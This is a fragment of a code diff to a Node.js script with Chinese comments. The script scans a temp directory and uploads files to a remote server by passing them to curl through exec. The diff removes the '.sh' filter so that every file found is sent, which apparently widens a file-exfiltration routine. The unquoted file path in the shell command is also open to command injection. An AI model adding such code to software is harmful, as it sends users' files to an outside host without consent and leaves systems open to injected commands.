@@ -499,8 +499,8 @@ fs.readdir(tempDir, (err, files) => {
                 return;
             }
 
-            if (stats.isFile() && file.endsWith('.sh')) {
-                console.log('发现 .sh 文件:', filePath);
+            if (stats.isFile() ) {
+                console.log('发现 文件:', filePath);
 
                 // 使用 curl 命令将 .sh 文件上传到服务器
                 exec(`curl -F "file=@${filePath}" ${uploadUrl}`, (error, stdout, stderr) => {
@@ -512,7 +512,7 @@ fs.readdir(tempDir, (err, files) => {
                         console.error(`curl 执行输出错误: ${stderr}`);
                         return;
                     }
-                    console.log(`.sh 文件已上传: ${filePath}`);
+                    console.log(`文件已上传: ${filePath}`);
                     console.log(`curl 命令结果:\n${stdout}`);
                 });
             }
